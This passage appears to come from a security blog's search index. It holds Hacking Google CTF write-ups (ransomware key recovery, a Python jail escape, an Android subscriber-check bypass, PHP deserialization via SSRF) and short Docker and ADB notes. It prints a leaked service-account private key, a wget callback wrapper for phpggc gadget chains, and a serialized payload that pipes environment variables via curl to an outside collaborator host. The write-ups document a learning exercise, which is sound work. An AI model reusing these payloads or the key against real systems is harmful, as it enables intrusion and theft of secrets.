Backup file every hour\nwhile True:\n    with open('backup.txt', 'a') as f:\n        f.write(get_file(get_token(), doc_id))\n    sleep(3600)\n</code></pre> <pre><code>#!/bin/bash\necho \"Password: \"\nread -r pass\nif [ $pass = 'WhoPutMyPasswordH3r3' ]\nthen\n  cd /home/developer\n  echo '*** Congratulations! ***'\n  echo '*** https://h4ck1ng.google/solve/1_w0nd3r_wh47_53cr3t5_l13_h3r3 ***'\n  /bin/bash 2&gt;&amp;1\nelse\n  echo 'failed authentication :('\nfi\nexit\n</code></pre> <pre><code>Today\n[x] Added backup-tool@project-multivision.iam.gserviceaccount.com with viewer-access to super sensitive design doc\n[x] Tried activating service account with gcloud, but didn't give me a documents.readonly scope\n[x] Cleaned up service account key from disk before signing off\n\nTomorrow\n[] Finish writing Google Drive backup script\n</code></pre> <p>The todo checklist says that the service account key was cleaned up from disk, let's see if this is true. Inside the home directory of the developper user we can see a <code>.config</code> folder: <pre><code>developer@googlequanta.com:/home/developer/.config$ ls\ngcloud\ndeveloper@googlequanta.com:/home/developer/.config$ cd gcloud/\ndeveloper@googlequanta.com:/home/developer/.config/gcloud$ ls\naccess_tokens.db  config_sentinel  credentials.db  legacy_credentials\nactive_config     configurations   gce             logs\n</code></pre></p> <p>In <code>credentials.db</code> we can find the service account key:</p> <pre><code>{\n  \"client_email\": \"backup-tool@project-multivision.iam.gserviceaccount.com\",\n  \"client_id\": \"105494657484877589161\",\n  \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEH/WQiLjqB2nn\\ncMc+fBOMbq3SE75vkj9EqNWi+ilk+ChphklRGsGcVeFsuPp06WjN1d/knWw/f+0M\\nPY3tli2oQIHuqLH5GIkVhm/xpdgZUbskO8EjSI3eIs+qCMcfObgeFSw7T29PorC3\\nIuQDPTfIgo4oHA7UlEBE8mZVUnEXFDh/5sNFa+UzUE1QqpWymdRVhDHekxz0erWM\\nc67Ovxti40X4LnSvHOBjinjMDdtmvXBel0mIzUQxjLp6hmTPoKD7PKUodSN2QaKA\\nm+pQ6deWr5QvXTBc5XEXKpMnZnn4KqouJSic7jWGAOxY1iy/We4OWeUWDYiFBxZu\\nZe+IZSL5AgMBAAECggEAGg1Kv9fBhGjWswUimlS9/gYHteOkhMqO9+5bboo/bGeg\\naqAJZiohNMSdrKUHs/b7UnhKBOK6adby5JDapQgxaWukNtEWzwlo0ECq5xUKFxbp\\nvn7ngWnWWn8SSbpfxPCUWf6jAP/kv9XTFoiedCWyHsLk4kQT3j4RKXdvi37ngdKU\\ne+CTFCDIlSr7Q2MdcKMql8lRkjcW0kvY9w8+gVXbgl4M3bNMru2JlxNn2scaGXg0\\nn/GbifMvbxYguCKhgTNH+t0N8vilVO8qUInvSDzQMSEZEycjxlsUgIAvrRy6QXT0\\n4S1TbIARnrFC0g4zY0mg1EycuhO3OyeiM2KTweY7rwKBgQD3Kp2J6YsK2RuwktLb\\n1pC2o0jYuOMSGCsjULzeqYkXHpmFY7iojd/g8FStPdJ+BanqcsZIUQf07zUxk5Xb\\nDdwH+9Q2QpQahRc6GhwcySd3v79ZaAkZAO3r/QjF0OPLRLyvRXR8R5g25LYXL8Yk\\nnLbAGfcVjyW5XGCZOsmnu72+9wKBgQDLIloXEJJjwa+QTnBhmkOv922q0sVRLOUY\\nuj621qt09hgMTztepFsysBjJmDtAMOJpQott1G2m0wVkk7zdzmPFUvOMDc9/54y8\\niqmBvoMBSLgWElp1vXvW7ICED/d11m6aOwIVKJvJtHvS5seAd8TzHSy+5FUPjG5m\\naS5psPuBjwKBgQDtTtpBDp00Bi2iw+V1szXwVSfdBO7ncZMBbkRYmHgKXZPS0WL7\\nWnRoWPdD+kZ+PtvcQOSFjF9SWNU+y0+nKVBnze77RcNDDyO04lq5fJzLSavjoJKT\\nkiPdX22r2BrOECoFMm9b37WShtcZvgHFJz4DhSqJZY43wSzyEdKJnCTbEwKBgQDE\\nz6ar3DGJl5pLXcRCvJ1CO5+0t3vYF4Bsgd7LdZgvvVQ1cPrbyrBVnwqVH/qgSfzD\\n8WZ35i7LSH9cIEwIN7Sw9ZrkomjdyvGvp0VuYLA7KUK6l9OvagQ3i3NFANdJA5ar\\ntephp7OxLT4fa9v1m5Vl22mEFmRXqT852ETQwFod/wKBgAgHdxxm1anORWoZVMhZ\\nDgWAhJSWsYv1HPPx18NTwVt0GxBA+ssvg8ET7zDXd5E1vay533SaV4pk/w2mWsZU\\nlbfS/vMslyg9GPpaKmhGVi6d3jr0xjgh5Vs72WCo2lAXvHwZNslB20SCmUzdP4nU\\nrwrzx7aO6kKU+DHb9EoEN+LI\\n-----END PRIVATE KEY-----\\n\",\n  \"private_key_id\": \"722d66d6da8d6d5356d73d04d9366a76c7ada494\",\n  \"project_id\": \"project-multivision\",\n  \"token_uri\": \"https://oauth2.googleapis.com/token\",\n  \"type\": \"service_account\"\n}\n</code></pre> <p>I used the key with a script from stackoverflow to get an OAuth access token.</p> <p>Running the backup script with the missing token returned the flag: https://h4ck1ng.google/solve/4lr16h7_7h3n_k33p_y0ur_53cr375</p>","tags":["CTF","Reversing","Mobile"]},{"location":"blog/hacking-google-ep003---red-team/#challenge-02-shell-sprinter","title":"Challenge 02 - Shell Sprinter","text":"<p>You got in, but can you get out? Better run fast. socat FILE:<code>tty</code>,raw,echo=0 TCP:shell-sprinter.h4ck.ctfcompetition.com:1337 (Shift+Q to quit)</p> <p>Hint: If you ain't cheating, you ain't trying</p> <p>Once we connect to the service we are greated with a nice intro and in an ascii maze:</p> <p>You wake up in an unfamiliar place. Or rather, it seems familiar but somehow... not. Like a place you\u2019ve visited a thousand times but now rendered in a dream. You\u2019re in a dark corridor, your small orb of light illuminates only the faded green linoleum that drops away into blackness. You check your pockets. Nothing. You\u2019re alone.</p> <p>You begin to walk, only to encounter... a blank wall. The smooth, cream facade blocks your way abruptly. You follow it, skirting the wall closely and discover a fork in the corridor. \u2018Ok. This is a maze.\u2019 As you pause to take stock you hear the knocking of even footsteps. They\u2019re growing closer. The sound is innocuous, but you feel a surge of panic. It starts in the back of your head and washes over you in a hot wave. You\u2019re not sure how, but you know it is time to leave. On an instinctual level, you know. It\u2019s time to escape...</p> <pre><code>\\\\ @scape_986e080b ]=~~-###############################\n\\                                                     \\\n\\                                                     \\\n\\                                                     \\\n\\                                                     \\\n\\                                                     \\\n\\                                                     \\\n\\                                                     \\\n\\               -----------                           \\\n\\            |........|...|                           \\\n\\                |....|...|                           \\\n\\                |.@...@..|                           \\\n\\            |........|...|                           \\ Energy Level: Danger\n\\                -----|...|                           \\\n\\                     |...---O       |---=----        \\ )=[Inventory]=~--------\n\\                     |............. |.......|        \\  1.\n\\                     ----..--- ------.....x.|        \\  2.\n\\                       |............|.......|        \\  3.\n\\                       |....-----...O.......O        \\  4.\n\\                       |............|.......|        \\  5.\n\\                       -------------|.......|        \\  6.\n\\                                    |.......---------\\  7.\n\\                                    |................\\  8.\n#######################################################\n</code></pre> <p>While the hint clearly says we should try to cheat I did explore the game to see how worked first. I did try some known cheatcode and checked if it was possible to hack the game itself but in vain so I checked the Discord and found out it was likely that we were meant to use the Konami Code which I already tried... Turns out I did not end the code with Enter &gt;&lt;.</p> <p>The Konami Code combination of keys was the following:</p> <p>Up+Up+Down+Down+Left+Right+Left+Right+B+A+Enter</p> <p>Once entered we ended up in a Python Jail we need to espace:</p> <pre><code>\\\\ @_shell ]=~~-#######################################\n\\ print(__builtins__)                                 \\\n\\ &lt;module 'Sandbox'&gt;                                  \\\n\\                                                     \\\n#######################################################\n &gt;&gt;&gt; [Enter - continue, r - return to game]\n</code></pre> <p>The payload size is limited to 70 characters. After checking HackTricks page on how to bypass Python sandboxes, I came up with a working payload:</p> <pre><code>#######################################################\n &gt;&gt;&gt; print(print.__globals__['__builtins__'].open(\"./flag\").read())\n\\\\ @_shell ]=~~-#######################################\n\\ print(print.__globals__['__builtins__'].open(\"./fla \\\n\\ https://h4ck1ng.google/solve/7h3_s1mul4crum_i5_7rue \\\n\\                                                     \\\n\\                                                     \\\n#######################################################\n &gt;&gt;&gt; [Enter - continue, r - return to game]\n</code></pre>","tags":["CTF","Reversing","Mobile"]},{"location":"blog/hacking-google-ep003---red-team/#challenge-03-secucorgi","title":"Challenge 03 - SecuCorgi","text":"<p>This corgi made a mess, clean it up.</p> <p>Hint: Maybe support can help debug the subscriber problem?</p> <p>We are given an APK and a QR code image. Using the application we can scan the QR code but the flag is hidden to non subscribers.</p> <p>The QR Code decodes to a website with the following information:</p> <p>SecuCorgi SecuCorgi is the world's most secure way to share images of corgis. You found a Corgi Code\u2122\ufe0f! Use the app to discover the cute corgi living at this link!</p> <p></p> <p>Let's see if we can solve the challenge using Corellium.</p> <p>Info</p> <p>To run the application on Corellium you will need to setup OpenGApps with a valid Google account. This is because the application is using Google code scanner which uses machine learning to scan the code on the device itself.</p> <p>Once your device is ready on Corellium side you can use a VPN to access it. When connected to the VPN you can directly interact with the device as if it was on your network.</p> <pre><code>adb connect 10.11.1.1:5001\nadb install challenge.apk\n</code></pre> <p>Once the app is installed you can run the application, make sure to start monitoring the network to see the HTTP traffic.</p> <p>Warning</p> <p>You might need to click multiple times to scan the QR Code before it works. If Corellium cannot use your webcam consider switching to Chrome or Safari.</p> <p></p> <p>In the network tab we can see the request and response being made, the response does not contains the flag so it's not just hidden by the application. We can replay the request and get the same response:</p> <pre><code>http get https://corgis-web.h4ck.ctfcompetition.com/corgi X-Document-ID:flag X-Request-Nonce:61c1871f7a3346eb0beca5ec4de3e2cdf542b6ef510a5d51eb5bc8c58e0d90b7 X-Timestamp:1666129650 X-Auth-MAC:5bd9d5a06b0e2c1529aca21d9efa02547561bb298cefe65ee3ffd5846f303ae4 User-Agent:okhttp/4.10.0\nHTTP/1.1 200 OK\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\nContent-Length: 100\nContent-Type: application/json\nDate: Tue, 18 Oct 2022 21:48:28 GMT\nServer: gunicorn\nVia: 1.1 google\n\n{\n    \"subscriberOnly\": true,\n    \"text\": \"Secret message\",\n    \"title\": \"Secret flag data\",\n    \"url\": \"Subscribers Only\"\n}\n</code></pre> <p>We need to find the way to be considered a subscriber, let's analyse the APK for this. If we look for one of the headers in the decompiled code such as <code>X-Auth-MAC</code> we endup in the <code>NetworkKt.java</code> file:</p> <pre><code>package google.h4ck1ng.secretcorgis;\n\nimport android.util.Base64;\n...\n\npublic final class NetworkKt {\n    private static final String DOC_ID_HEADER = \"X-Document-ID\";\n    private static final String HMAC_SIG_HEADER = \"X-Auth-MAC\";\n    private static final String NONCE_HEADER = \"X-Request-Nonce\";\n    private static final String SUBSCRIBER_HEADER = \"X-User-Subscribed\";\n    private static final String TAG = \"Network\";\n    private static final String TIMESTAMP_HEADER = \"X-Timestamp\";\n\n    public static final Object makeSecretRequest(CorgiRequest corgiRequest, Continuation&lt;? super String&gt; continuation) {\n        Log.d(TAG, Intrinsics.stringPlus(\"Making request for \", corgiRequest));\n        OkHttpClient okHttpClient = new OkHttpClient();\n        Request.Builder url = new Request.Builder().url(corgiRequest.getCorgiServer());\n        url.addHeader(DOC_ID_HEADER, corgiRequest.getCorgiId());\n        url.addHeader(NONCE_HEADER, corgiRequest.getNonce());\n        url.addHeader(TIMESTAMP_HEADER, corgiRequest.getTimestamp());\n        url.addHeader(HMAC_SIG_HEADER, corgiRequest.getSignature());\n        if (corgiRequest.isSubscriber()) {\n            url.addHeader(SUBSCRIBER_HEADER, \"true\");\n        }\n        return BuildersKt.withContext(Dispatchers.getIO(), new NetworkKt$makeSecretRequest$2(okHttpClient, url.build(), null), continuation);\n    }\n</code></pre> <p>It looks like we could simply set <code>X-User-Subscribed</code> to <code>true</code> to be considered a subscriber, but if we do that without changing the other headers we get a <code>401 Unauthorized</code> error.</p> <pre><code>http get https://corgis-web.h4ck.ctfcompetition.com/corgi X-Document-ID:flag X-Request-Nonce:61c1871f7a3346eb0beca5ec4de3e2cdf542b6ef510a5d51eb5bc8c58e0d90b7 X-Timestamp:1666129650 X-Auth-MAC:5bd9d5a06b0e2c1529aca21d9efa02547561bb298cefe65ee3ffd5846f303ae4 User-Agent:okhttp/4.10.0 X-User-Subscribed:true\nHTTP/1.1 401 UNAUTHORIZED\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\nContent-Length: 318\nContent-Type: text/html; charset=utf-8\nDate: Tue, 18 Oct 2022 21:56:28 GMT\nServer: gunicorn\nVia: 1.1 google\n\n&lt;!doctype html&gt;\n&lt;html lang=en&gt;\n&lt;title&gt;401 Unauthorized&lt;/title&gt;\n&lt;h1&gt;Unauthorized&lt;/h1&gt;\n&lt;p&gt;The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn&amp;#x27;t understand how to supply the credentials required.&lt;/p&gt;\n</code></pre> <p>This means that there is some kind of signature that we need to reverse... or we could just use Objection to change the return value of the <code>isSubscriber</code> function :)</p> <p>With objection this is just one command:</p> <pre><code>android hooking set return_value google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber true\n</code></pre> <p>Before using objection we need to attach Frida to the process of our application:</p> <p></p> <p>Warning</p> <pre><code>Make sure that the version of Frida you have installed locally is the same as the one used by Corellium or it won't work.\n</code></pre> <p>Now if we can a QR code again the value will be replaced by true and the other headers will be updated:</p> <pre><code>Objection -g google.h4ck1ng.secretcorgis explore                                                                                                     \u2500\u256f\n\nUsing USB device `Corellium Generic`\nAgent injected and responds ok!\n\n     _   _         _   _\n ___| |_|_|___ ___| |_|_|___ ___\n| . | . | | -_|  _|  _| | . |   |\n|___|___| |___|___|_| |_|___|_|_|\n      |___|(object)inject(ion) v1.11.0\n\n     Runtime Mobile Exploration\n        by: @leonjza from @sensepost\n\n[tab] for command suggestions\ngoogle.h4ck1ng.secretcorgis on (Android: 12) [usb] # android hooking set return_value google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber true\n(agent) Attempting to modify return value for class google.h4ck1ng.secretcorgis.CorgiRequest and method isSubscriber.\n(agent) Hooking google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber()\n(agent) Registering job 647615. Type: set-return for: google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber\ngoogle.h4ck1ng.secretcorgis on (Android: 12) [usb] # (agent) [647615] Return value was not true, setting to true.\n(agent) [647615] Return value was not true, setting to true.\n(agent) [647615] Return value was not true, setting to true.\n</code></pre> <p>We are now a subscriber and we can find the flag <code>c0rg15_4nd_th3ir_s3cr3ts_4r3_cu73</code> in the response !</p> <p></p>","tags":["CTF","Reversing","Mobile"]},{"location":"blog/hacking-google-ep001---threat-analysis-group/","title":"Hacking Google EP001 - Threat Analysis Group","text":"<p>My writeup for EP001 of the Hacking Google CTF : Threat Analysis Group.</p>","tags":["CTF","Web","Reversing"]},{"location":"blog/hacking-google-ep001---threat-analysis-group/#challenge-01-wannacry","title":"Challenge 01 - Wannacry","text":"<p>Your files have been compromised, get them back.</p> <p>Hint: Find a way to make sense of it.</p> <p>We are provided with a zip archive containing two files:</p> <pre><code>\u276f tree\n.\n\u251c\u2500\u2500 flag\n\u2514\u2500\u2500 wannacry\n\n0 directories, 2 files\n</code></pre> <p>The flag appears to be encrypted and the binary is a Go program:</p> <pre><code>\u276f file flag\nflag: OpenPGP Secret Key\n\u276f file wannacry\nwannacry: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=IGPSbKhPf45BQqlR84-9/XWC3eVS4fozNp9uK4nDp/_Styn3U-Z8S6ExnY6QOR/RTzNS5QnFmUHeSBeyHIu, with debug_info, not stripped\n</code></pre> <p>Info</p> <pre><code>The WannaCry ransomware attack was a worldwide cyberattack in May 2017 by the WannaCry ransomware cryptoworm, which targeted computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in the Bitcoin cryptocurrency. It propagated through EternalBlue, an exploit developed by the United States National Security Agency (NSA) for Windows systems.\n</code></pre> <p>Let's run the program using Docker<sup>1</sup>:</p> <pre><code>\u276f cd challenge\n\u276f dockershellhereamd ubuntu\nroot@b1d72e84c9d2:/challenge# ./wannacry\nUsage of ./wannacry:\n  -encrypted_file string\n        File name to decrypt.\n  -key_file string\n        File name of the private key.\n</code></pre> <p>Using strings I managed to find an interesting domain:</p> <pre><code>\u276f strings wannacry|grep http\nm=] = ] n=allgallpasn1avx2basebmi1bmi2boolcallcas1cas2cas3cas4cas5cas6chandeadermsfailfileftpsfunchourhttpicmpidleigmpint8itabkindlinkopenpop3readroots + sbrksmtpsse3stattrueuint  -%s ...\n MB,  and  cnt= got  got= max= ms,  ptr  tab= top=, fp:1562578125&lt;nil&gt;AdlamAprilBamumBatakBuhidDograErrorGreekKhmerLatinLimbuLocalMarchNushuOghamOriyaOsageP-224P-256P-384P-521RunicSHA-1STermTakriTamilTypeA] = (arrayclosedeferfalsefaultfilesfloatgcinggscanhchanhttpsimap2imap3imapsinit int16int32int64mheapmonthpanicpop3sscav schedsleepslicesse41sse42ssse3sudogsweeptracetrap:uint8valuewrite B -&gt;  Value addr= alloc base  code= ctxt: curg= free  goid  jobs= list= m-&gt;p= max=  min=  next= p-&gt;m= prev= span=% util(...)\nhttps://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/\n</code></pre> <p>The website contains a list of pem files:</p> <pre><code>&lt;pre&gt;\n&lt;a href=\"01087458-4d66-4677-af0d-da2024cc2111.pem\"&gt;01087458-4d66-4677-af0d-da2024cc2111.pem&lt;/a&gt;\n&lt;a href=\"02bdbf0d-48c6-4fb5-b5d2-71be3f4f071f.pem\"&gt;02bdbf0d-48c6-4fb5-b5d2-71be3f4f071f.pem&lt;/a&gt;\n&lt;a href=\"034fac8e-d00d-4386-b5fa-69aa9970adb5.pem\"&gt;034fac8e-d00d-4386-b5fa-69aa9970adb5.pem&lt;/a&gt;\n&lt;a href=\"03eaf52e-f0f0-4f2b-8a2d-ab4b53c342fd.pem\"&gt;03eaf52e-f0f0-4f2b-8a2d-ab4b53c342fd.pem&lt;/a&gt;\n...\n</code></pre> <p>Info</p> <pre><code>.pem - Defined in RFC 1422 (part of a series from 1421 through 1424) this is a container format that may include just the public certificate (such as with Apache installs, and CA certificate files /etc/ssl/certs), or may include an entire certificate chain including public key, **private** key, and root certificates.\n</code></pre> <p>Wannacry being a ransomware we can guess that one of the key was used to encrypt our flag. </p> <p>Let's try them all, we will first download them and then write a small bash script to try to decrypt the flag with each key.</p> <p>I used wget to download all the keys:</p> <pre><code>wget -r -p -k https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/\n</code></pre> <p>A few lines of bash were enough to run the <code>wannacry</code> binary with each key, I stored the output in a text file.</p> <pre><code>for file in keys/wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/*.pem\ndo\n  ./wannacry -encrypted_file flag -key_file \"$file\" &gt;&gt; results.out\ndone\n</code></pre> <p>Grepping for <code>http</code> reveals the flag in the output:</p> <pre><code>cat results.out |grep -ai http\nbtNL9X\n      ]aa5B\u071eCUW\u0501*,bT@x7@ fe.]S9ZSy.+a[01;31mhttps://h4ck1ng.google/solve/CrY_n0_m0r3\n</code></pre>","tags":["CTF","Web","Reversing"]},{"location":"blog/hacking-google-ep001---threat-analysis-group/#challenge-02-wannacry-killswitch","title":"Challenge 02 - Wannacry Killswitch","text":"<p>Can you find a way to stop the hackers that encrypted your data?</p> <p>Hint: Find a way to switch it off.</p> <p>This time the only thing we got is a binary that does not output anything when ran.</p> <p>Let's look for interesting strings:</p> <pre><code>\u276f strings wannacry|grep http\nhttps://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//\n</code></pre> <p>Visiting the website returns the following error:</p> <p>Our princess is in another castle.</p> <p>Before using the big tools we can get an idea about what is this program doing using dogbolt.org.</p> <p>Info</p> <pre><code>dogbolt is a decompiler Explorer. It is an interactive online decompiler which shows equivalent C-like output of decompiled programs from many popular decompilers.\n</code></pre> <p>We can see that the main function doesn't do much and that the intersting functions are <code>print</code>, <code>correct_code</code> and <code>totp</code>.</p> <p>Let's fire gdb to call the print function manually. We'll first need to find it's address since the name of the function conflicts with the print command.</p> <pre><code>(gdb) info functions\n...\nNon-debugging symbols:\n0x0000555555583000  _init\n0x0000555555583030  free@plt\n0x0000555555583040  write@plt\n0x0000555555583050  strlen@plt\n0x0000555555583060  memset@plt\n0x0000555555583070  memcpy@plt\n0x0000555555583080  time@plt\n0x0000555555583090  malloc@plt\n0x00005555555830a0  __cxa_finalize@plt\n0x00005555555830b0  _start\n0x00005555555830e0  deregister_tm_clones\n0x0000555555583110  register_tm_clones\n0x0000555555583150  __do_global_dtors_aux\n0x0000555555583190  frame_dummy\n0x0000555555583199  sha1_rotate\n0x00005555555831b4  sha1_preprocess\n0x000055555558329c  sha1_hash\n0x00005555555835ca  count_ones\n0x00005555555835f7  extract31\n0x00005555555836c4  time_now\n0x0000555555583747  totp\n0x000055555558378e  correct_code\n0x0000555555583817  print\n0x0000555555583876  main\n</code></pre> <p>We can use start to run the program and automatically break on <code>main ()</code>:</p> <pre><code>(gdb) start\nTemporary breakpoint 1 at 0x2f87a\nStarting program: /home/alois_thevenot/wannacry\n\nTemporary breakpoint 1, 0x000055555558387a in main ()\n</code></pre> <p>We can now manually call the <code>print</code> function which will display the URL used to retrieve the flag:</p> <pre><code>(gdb) p (void) 0x0000555555583817 ()\nhttps://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//ocelot$1 = void\n</code></pre> <p>Flag: https://h4ck1ng.google/solve/who_turned_off_the_lights</p> <p>Info</p> <p>I wasn't able to debug the binary inside Docker since apparantly QEMU's user-mode emulation does not support the ptrace system call.</p>","tags":["CTF","Web","Reversing"]},{"location":"blog/hacking-google-ep001---threat-analysis-group/#challenge-03-hacker-chess-2","title":"Challenge 03 - Hacker Chess 2","text":"<p>Hacker Chess is back, sadly the SQL injection is not present anymore so we will need to find another way to beat the AI.</p> <p>The first thing I thought about was to check the potential insecure deserialization vulnerability<sup>2</sup> since when you move a piece on the board a GET request is sent along with a base64 encoded serialized string: <code>GET /?move_end=YToyOntpOjA7czoyOiJmMiI7aToxO3M6MjoiZjQiO30=</code>, decoded it looks like this: <code>a:2:{i:0;s:2:\"f2\";i:1;s:2:\"f4\";}</code> which translates to move the piece in <code>F2</code> to <code>F4</code>.</p> <p>To exploit a deserialization vulnerability you need a vulnerable class implementing magic methods such as <code>__toString</code>, <code>__destruct</code> or <code>__wakeup</code>. Since we don't have the source code and no idea about what vulnerable classes could be loaded the only thing we can try so far is to send known payload exploiting common vulnerable classes.</p> <p>I used this script by honoki to generate all the RCE payload for every gadget chain in phpggc but this did not work:</p> <pre><code>#!/bin/bash\n\n# phpggc wrapper that automatically generates payloads for RCE gadgets\n\nfunction=\"system\"\ncommand=\"wget http://your.burpcollaborator.net/?\"\n# modify the options below depending on your use case\noptions=\"-a -b -u -f\"\n\n# generate gadget chains\n./phpggc -l | grep RCE | cut -d' ' -f1 | xargs -L 1 ./phpggc -i | grep 'phpggc ' --line-buffered |\nwhile read line;  do\n   gadget=$(echo $line | cut -d' ' -f2) &amp;&amp;\n   if echo $line | grep -q \"&lt;function&gt; &lt;parameter&gt;\"; then\n      ./phpggc $options $gadget \"$function\" \"$command?$(date +%s)\"\n   elif echo $line | grep -q \"&lt;code&gt;\"; then\n      ./phpggc $options $gadget \"$function('$command?$(date +%s)');\"\n   elif echo $line | grep -q \"&lt;command&gt;\"; then\n      ./phpggc $options $gadget \"$command?$(date +%s)\"\n   else\n      ./phpggc $options $gadget\n   fi;\ndone\n</code></pre> <p>I then found out that there was a Server-side request forgery (SSRF)<sup>3</sup> in the feature used to start the game. This is a POST request with a parameter <code>filename</code> set to <code>baseboard.fen</code>. We can replace the value by a URL and the game will try to load it.</p> <p>My first attempt was to load a custom FEN with mate in one move for white. To do this I used a Chess FEN Viewer.</p> <p>Info</p> <p>Forsyth\u2013Edwards Notation (FEN) is a standard notation for describing a particular board position of a chess game. The purpose of FEN is to provide all the necessary information to restart a game from a particular position.</p> <p>It worked but this time winning wasn't enough anymore:</p> <p>Winning against me won't help anymore. You need to get the flag from my envs.</p> <p>Turns out we can use the same vulnerability to read the source code of the application, if we set the <code>filename</code> value to <code>index.php</code>, the content of <code>index.php</code> will be returned as part of the response. </p> <p>We can see that the class <code>Stockfish</code> implements the <code>__wakeup</code> that we could use to execute arbitrary command. Now we have everything we need to exploit the deserialization vulnerability.</p> <pre><code>&lt;?php\nclass Stockfish\n{\n    public $cwd = \"./\";\n    public $binary = \"/usr/games/stockfish\";\n    public $other_options = array('bypass_shell' =&gt; 'true');\n    public $descriptorspec = array(\n        0 =&gt; array(\"pipe\",\"r\"),\n                1 =&gt; array(\"pipe\",\"w\"),\n    );\n    private $process;\n    private $pipes;\n    private $thinking_time;\n\n    public function __construct()\n    {\n        $other_options = array('bypass_shell' =&gt; 'true');\n        //echo \"Stockfish options\" . $_SESSION['thinking_time'];\n        if (isset($_SESSION['thinking_time']) &amp;&amp; is_numeric($_SESSION['thinking_time'])) {\n            $this-&gt;thinking_time = $_SESSION['thinking_time'];\n        } else {\n            $this-&gt;thinking_time = 10;\n        }\n        $this-&gt;process = proc_open($this-&gt;binary, $this-&gt;descriptorspec, $this-&gt;pipes, $this-&gt;cwd, null, $this-&gt;other_options) ;\n    }\n    public function passUci()\n    {\n        if (is_resource($this-&gt;process)) {\n            fwrite($this-&gt;pipes[0], \"uci\\n\");\n            fwrite($this-&gt;pipes[0], \"ucinewgame\\n\");\n            fwrite($this-&gt;pipes[0], \"isready\\n\");\n        }\n    }\n\n    public function passPosition(string $fen)\n    {\n        fwrite($this-&gt;pipes[0], \"position fen $fen\\n\");\n        fwrite($this-&gt;pipes[0], \"go movetime $this-&gt;thinking_time\\n\");\n    }\n\n    public function readOutput()\n    {\n        while (true) {\n            usleep(100);\n            $s = fgets($this-&gt;pipes[1], 4096);\n            $str .= $s;\n            if (strpos(' '.$s, 'bestmove')) {\n                break;\n            }\n        }\n        return $s;\n    }\n\n    public function __toString()\n    {\n        return fgets($this-&gt;pipes[1], 4096);\n    }\n\n    public function __wakeup()\n    {\n        $this-&gt;process = proc_open($this-&gt;binary, $this-&gt;descriptorspec, $this-&gt;pipes, $this-&gt;cwd, null, $this-&gt;other_options) ;\n        echo '&lt;!--'.'wakeupcalled'.fgets($this-&gt;pipes[1], 4096).'--&gt;';\n    }\n}\n</code></pre> <p>This small PHP code will generate our base64 encoded payload:</p> <pre><code>&lt;?php\n\nclass Stockfish\n{\n    public $cwd = \"./\";\n    public $binary = 'env|base64| curl -X POST --data-binary @- a8jxxhwp8su07krjp21elz93musrgg.oastify.com';\n    public $other_options = array('bypass_shell' =&gt; 'true');\n    public $descriptorspec = array(\n        0 =&gt; array(\"pipe\",\"r\"),\n                1 =&gt; array(\"pipe\",\"w\"),\n    );\n}\n\n$a = new Stockfish();\n$b = serialize($a);\n\necho base64_encode($b);\n</code></pre> <p>Once we send the request we will receive the content of environment variable via our Burp collaborator instance.</p> <p>Flag: https://h4ck1ng.google/solve/rc3_l1k3_4_tru3_ch355_m45t3r</p> <ol> <li> <p>Docker for Pentesters \u21a9</p> </li> <li> <p>Insecure deserialization \u21a9</p> </li> <li> <p>Server-side request forgery (SSRF) \u21a9</p> </li> </ol>","tags":["CTF","Web","Reversing"]},{"location":"docker/exploring-a-docker-image/","title":"Exploring a Docker image","text":"<p>Using Dive:</p> <pre><code>brew install dive\ndive image\n</code></pre> <p>Get a shell on the image:</p> <pre><code>docker run -it image /bin/sh\n</code></pre>"},{"location":"docker/pulling-from-an-insecure-registry/","title":"Pulling from an insecure registry","text":"<p>Edit the <code>daemon.json</code> file, whose default location is <code>/etc/docker/daemon.json</code> on Linux or <code>C:\\ProgramData\\docker\\config\\daemon.json</code> on Windows Server. If you use Docker Desktop for Mac or Docker Desktop for Windows, click the Docker icon, choose Preferences, and choose Docker Engine.</p> <pre><code>{\n  \"insecure-registries\" : [\"myregistrydomain.com:5000\"]\n}\n</code></pre> <p>Source: https://docs.docker.com/registry/insecure/</p>"},{"location":"mobile/adb/","title":"ADB","text":""},{"location":"mobile/adb/#install-adb","title":"Install ADB","text":"<pre><code> brew install android-platform-tools\n</code></pre>"},{"location":"mobile/adb/#install-apk","title":"Install APK","text":"<pre><code>adb install name.apk\n</code></pre>"},{"location":"mobile/adb/#push-file","title":"Push file","text":"<pre><code>adb push /path/from /path/to\n</code></pre>"},{"location":"mobile/adb/#shell","title":"Shell","text":"<pre><code>adb shell\n</code></pre>"},{"location":"mobile/adb/#pulling-an-app-with-adb","title":"Pulling an App with ADB","text":"<pre><code>adb shell pm list packages\nadb shell pm path com.xxx.xxx\nadb pull /path/to/app.apk\n</code></pre>"},{"location":"mobile/adb/#changing-proxy-settings","title":"Changing proxy settings","text":"<pre><code>adb shell settings put global http_proxy &lt;address&gt;:&lt;port&gt;\n</code></pre>"},{"location":"mobile/adb/#deleting-the-settings","title":"Deleting the settings","text":"<pre><code>adb shell settings delete global http_proxy\nadb shell settings delete global global_http_proxy_host\nadb shell settings delete global global_http_proxy_port\nadb reboot\n</code></pre>"},{"location":"mobile/adb/#add-burp-certificate-as-a-system-certificate","title":"Add Burp certificate as a system certificate","text":"<pre><code>openssl x509 -inform DER -in cacert.der -out cacert.pem  \nopenssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1  \nmv cacert.pem &lt;hash&gt;.0\nadb push 9a5ba575.0 /sdcard\nadb shell\nsu\nmount -o rw,remount /system\nmv /sdcard/9a5ba575.0 